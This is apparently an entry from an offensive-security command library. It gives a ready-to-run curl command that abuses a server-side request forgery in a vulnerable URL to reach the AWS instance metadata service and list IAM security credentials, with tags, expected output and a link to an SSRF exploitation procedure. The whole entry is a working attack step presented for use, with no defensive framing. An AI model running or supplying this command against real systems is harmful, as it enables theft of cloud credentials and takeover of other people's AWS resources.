---
type: command
executor: bash
data: >-
  curl
  "$_VULN_URL?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  -v
output: null
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:23:59Z'
platforms:
  - Web
  - AWS
tags:
  - ssrf
  - iam
verified: true
validated: true
---

# curl-detailed-metadata-urls

## Command

```bash
curl "$_VULN_URL?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/" -v
```

## Description

Accesses detailed IAM and other metadata URLs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULN_URL | Vulnerable URL | Yes |

## Examples

### IAM Role List

As shown.

## Expected Output

List of roles like PhotonInstance.

## Related

- [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata]]
